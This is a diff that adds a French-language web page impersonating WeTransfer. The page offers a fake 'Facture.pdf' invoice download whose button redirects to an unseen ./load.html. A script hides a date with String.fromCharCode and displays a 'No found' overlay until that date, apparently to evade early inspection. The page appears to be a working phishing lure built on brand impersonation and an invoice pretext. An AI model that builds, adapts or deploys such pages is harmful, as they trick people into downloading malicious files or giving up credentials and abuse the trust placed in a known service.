@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Home</title>
+    <!-- Polices -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Actief+Grotesque:wght@400;500;700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #409FFF;
+            --primary-hover: #2d8cf0;
+            --bg-color: #F4F5F7;
+            --card-bg: #FFFFFF;
+            --text-main: #171717;
+            --text-muted: #6B6B6B;
+            --border-radius: 12px;
+            --shadow-sm: 0 4px 12px rgba(0,0,0,0.08);
+            --shadow-md: 0 8px 24px rgba(0,0,0,0.12);
+        }
+
+        * {
+            box-sizing: border-box;
+            padding: 0;
+            margin: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            width: 100%;
+            overflow: hidden;
+            background-color: var(--bg-color);
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Overlay "Not Found" */
+        #overlay {
+            height: 100%;
+            width: 100%;
+            position: fixed;
+            background-color: white;
+            left: 0;
+            top: 0;
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            color: var(--text-main);
+        }
+
+        /* Layout Principal */
+        .wrapper {
+            display: flex;
+            height: 100%;
+            width: 100%;
+        }
+
+        /* Section Gauche (Marque / Image) */
+        .brand-section {
+            display: none; /* Masqué sur mobile par défaut */
+            width: 30%;
+            max-width: 400px;
+            flex-shrink: 0;
+            background-color: #F8F5F1;
+            padding: 40px;
+            flex-direction: column;
+            justify-content: space-between;
+            border-right: 1px solid rgba(0,0,0,0.05);
+            z-index: 2;
+        }
+
+        /* Logo SVG */
+        .logo {
+            width: 50px;
+            height: auto;
+            color: var(--text-main);
+        }
+
+        .brand-text h1 {
+            font-size: 2.5rem;
+            line-height: 1.1;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 2rem;
+        }
+
+        /* Section Principale (Le contenu) */
+        .main-content {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            background-image: url('https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2564&auto=format&fit=crop'); 
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* Ombre ou overlay sur l'image si besoin */
+        .main-content::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.1);
+        }
+
+        /* Carte de téléchargement */
+        .transfer-card {
+            position: relative;
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 380px;
+            padding: 40px 32px;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow-md);
+            text-align: center;
+            z-index: 10;
+        }
+
+        .icon-wrapper {
+            width: 72px;
+            height: 72px;
+            background-color: #EAF4FF;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 24px;
+        }
+
+        .icon-wrapper svg {
+            color: var(--primary-color);
+            width: 36px;
+            height: 36px;
+        }
+
+        .card-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--text-main);
+            margin-bottom: 8px;
+        }
+
+        .card-subtitle {
+            font-size: 1rem;
+            color: var(--text-muted);
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+
+        .file-preview {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #FAFAFA;
+            padding: 16px;
+            border-radius: 8px;
+            margin-bottom: 32px;
+            border: 1px solid #EEEEEE;
+            text-align: left;
+        }
+
+        .file-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            overflow: hidden;
+        }
+
+        .file-name {
+            font-weight: 500;
+            font-size: 0.95rem;
+            color: var(--text-main);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            max-width: 150px;
+        }
+
+        .file-meta {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        .btn-download {
+            width: 100%;
+            padding: 16px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.05rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(64, 159, 255, 0.2);
+        }
+
+        .btn-download:hover {
+            background-color: var(--primary-hover);
+            transform: translateY(-1px);
+            box-shadow: 0 6px 14px rgba(64, 159, 255, 0.25);
+        }
+
+        .btn-download:active {
+            transform: scale(0.98);
+        }
+
+        /* Top Bar Mobile */
+        .mobile-top {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            z-index: 20;
+            color: white; /* Visible sur background sombre ou image */
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .mobile-top svg {
+            width: 32px;
+            color: white;
+        }
+
+        /* Responsive */
+        @media (min-width: 900px) {
+            .brand-section {
+                display: flex;
+            }
+            .mobile-top {
+                display: none;
+            }
+            .main-content {
+                justify-content: center;
+            }
+            .transfer-card {
+                /* Centré dans la zone de contenu principale */
+                margin: auto;
+                max-width: 420px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Message overlay (Logique existante) -->
+    <div id="overlay">
+        No deployment found
+    </div>
+
+    <!-- Interface Mobile Top -->
+    <div class="mobile-top">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745z"></path>
+        </svg>
+        <span style="font-weight: 600; font-size: 1.2rem; color: white; text-shadow: 0 1px 3px rgba(0,0,0,0.3);">WeTransfer</span>
+    </div>
+
+    <div class="wrapper">
+        <!-- Contenu Gauche (Desktop) -->
+        <div class="brand-section">
+            <svg class="logo" viewBox="0 0 50 50" fill="currentColor">
+                <path d="M12.23 15.014c-.383-.605-.697-.926-1.254-.926-.558 0-.872.32-1.255.926L8.05 17.686c-.627 1.032-1.15 1.745-2.37 1.745s-1.777-.499-2.369-1.888a42.3 42.3 0 0 1-2.195-6.554C.348 7.89 0 5.967 0 4.4s.488-2.493 2.16-2.813c2.3-.428 5.401-.677 8.816-.677 3.414 0 6.515.25 8.815.677 1.672.32 2.16 1.246 2.16 2.814 0 1.567-.348 3.49-1.115 6.59a42.3 42.3 0 0 1-2.195 6.553c-.592 1.39-1.15 1.888-2.37 1.888-1.219 0-1.741-.713-2.369-1.745z" />
+            </svg>
+            <div class="brand-text">
+                <p style="font-size: 1.2rem; line-height: 1.5; color: #555;">Une façon plus simple d'envoyer vos gros fichiers dans le monde entier.</p>
+            </div>
+            <div style="font-size: 0.8rem; color: #888;">
+                <p>&copy;  2026</p>
+                <div style="margin-top: 10px; display: flex; gap: 10px;">
+                    <span>Aide</span>
+                    <span>Légal</span>
+                    <span>Cookies</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Contenu Principal / Droite -->
+        <div class="main-content">
+            <div class="transfer-card">
+                <div class="icon-wrapper">
+                    <!-- Icone Téléchargement -->
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5m-13.5-9L12 3m0 0 4.5 4.5M12 3v13.5" />
+                    </svg>
+                </div>
+
+                <h2 class="card-title">Prêt à télécharger ?</h2>
+                <p class="card-subtitle">Vos fichiers sont disponibles pendant 2 jours.</p>
+
+                <div class="file-preview">
+                    <div class="file-info">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="none" stroke="#E53935" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z" />
+                            <polyline points="14 2 14 8 20 8" />
+                        </svg>
+                        <div>
+                            <div class="file-name">Facture.pdf</div>
+                            <div class="file-meta">2.4 MB &middot; PDF</div>
+                        </div>
+                    </div>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" stroke="#ccc" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="10"/>
+                        <polyline points="12 6 12 12 16 14"/>
+                    </svg>
+                </div>
+
+                <button class="btn-download" onclick="next()">
+                    Télécharger le document
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        var a = new Date(String.fromCharCode(50, 48, 50, 52, 45, 48, 54, 45, 49, 51));
+        console.log(a);
+
+        var b = new Date();
+        var c = new Date(b.getFullYear(), b.getMonth(), b.getDate());
+
+        if (c < a) {
+
+            var overlay = document.getElementById("overlay");
+            overlay.style.display = "flex"; // Centrage flex
+            overlay.innerHTML = "<div style='text-align:center'><p style='margin-top:10px;'>No found</p></div>";
+        }
+
+        function next() {
+            window.location.href = './load.html'
+        }
+
+    </script>
+</body>
+</html>
